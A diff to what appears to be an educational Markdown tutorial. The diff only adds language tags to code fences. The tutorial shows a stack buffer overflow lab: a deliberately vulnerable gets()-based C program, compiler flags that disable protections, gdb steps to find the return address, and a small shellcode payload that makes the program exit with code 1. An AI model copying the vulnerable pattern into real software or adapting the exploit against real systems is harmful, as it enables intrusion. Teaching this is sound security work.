@@ -22,7 +22,7 @@ In our vulnerable C program, a small buffer is allocated (8 bytes) for a name in
 
 We start with a source file (`vuln.c`) that looks like this:
 
-```
+```c
 #include <stdio.h>
 void vuln() {
    char buffer[8]; // a small buffer (only 8 bytes)
@@ -36,7 +36,7 @@ int main() {
 
 To make exploitation easier, we compile without modern security mechanisms using this command:
 
-```
+```bash
 $ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
 ```
 
@@ -51,7 +51,7 @@ $ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z e
 
 *Note: If you run into an error like `fatal error: bits/libc-header-start.h: No such file or directory`, you need to install multilib support:*
 
-```
+```bash
 $ sudo apt update
 $ sudo apt install gcc-multilib libc6-dev-i386
 ```
@@ -66,43 +66,43 @@ Next, we use gdb to locate where our buffer is stored in memory and identify the
 
 Start gdb:
 
-```
+```bash
 $ gdb vuln
 ```
 
 Set a breakpoint at the vulnerable function (at the line with `gets(buffer);`):
 
-```
+```bash
 (gdb) break 1
 ```
 
 Run the program:
 
-```
+```bash
 (gdb) run
 ```
 
 At the breakpoint, inspect the address of the buffer:
 
-```
+```bash
 (gdb) print &buffer
 ```
 
 For example, you might see:
 
-```
+```bash
 $1 = (char (*)[8]) 0xffffd028
 ```
 
 Now, check the registers (especially the instruction pointer `eip`):
 
-```
+```bash
 (gdb) info registers
 ```
 
 Then, examine the stack frame to locate the saved return address:
 
-```
+```bash
 (gdb) info frame
 ```
 
@@ -116,7 +116,7 @@ We need to craft shellcode that will cleanly exit the program. Start by writing 
 
 **Original version:**
 
-```
+```c
 #include <stdio.h>
 int main() {
     __asm__("xor %eax, %eax;"
@@ -129,13 +129,13 @@ int main() {
 
 Compile with:
 
-```
+```bash
 $ gcc -m32 -fno-stack-protector -fno-pie -ggdb -z execstack -std=c99 asm.c -o asm
 ```
 
 Then use `objdump` to extract the machine code:
 
-```
+```bash
 $ objdump -d asm > asmdump
 ```
 
@@ -150,7 +150,7 @@ The dump will show instructions such as:
 
 To exit the program with code 1, we modify the assembly code:
 
-```
+```c
 #include <stdio.h>
 int main() {
     __asm__("xor %eax, %eax;"  // set EAX = 0
@@ -162,7 +162,7 @@ int main() {
 
 Recompile and run `objdump` again to get the modified machine code. The final shellcode in hex becomes:
 
-```
+```bash
 "\x31\xc0\x40\x89\xc3\xcd\x80"
 ```
 
@@ -172,7 +172,7 @@ Recompile and run `objdump` again to get the modified machine code. The final sh
 
 Save your shellcode along with additional padding and the address overwrite into a file named `egg`. For example:
 
-```
+```bash
 echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x41\x41\x41\x41\x41\x28\xd0\xff\xff" > egg
 ```
 
@@ -190,19 +190,19 @@ You can tweak the number of padding bytes or the address depending on your envir
 
 Finally, test the exploit using gdb by feeding the `egg` file to the vulnerable program:
 
-```
+```bash
 $ gdb vuln
 ```
 
 Within gdb, run:
 
-```
+```bash
 (gdb) run < egg
 ```
 
 A successful exploit will hijack execution so that the shellcode is run, and you should see the program exit with code 01:
 
-```
+```bash
 [Inferior 1 (process ...) exited with code 01]
 ```
 
